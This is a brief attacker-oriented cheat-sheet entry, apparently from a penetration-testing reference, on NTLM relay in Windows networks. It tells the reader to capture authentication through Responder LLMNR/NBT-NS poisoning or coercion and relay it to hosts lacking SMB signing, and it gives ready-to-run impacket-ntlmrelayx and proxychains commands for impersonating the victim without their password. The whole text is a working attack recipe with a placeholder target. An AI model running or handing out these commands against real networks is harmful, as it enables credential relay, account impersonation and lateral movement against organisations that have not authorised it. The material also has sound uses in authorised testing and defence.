Don't crack the NetNTLM hash — relay it. Capture an authentication (Responder
poisoning LLMNR/NBT-NS, or a coercion) and forward it to a host that doesn't
enforce SMB signing; you act as that user without ever knowing their password.
`-socks` parks the authenticated session so you can ride it with proxychains.
Build the no-signing target list first (`nxc --gen-relay-list`).

```sh
impacket-ntlmrelayx -t smb://{{rhost}} -smb2support -socks
proxychains nxc smb {{rhost}}
```
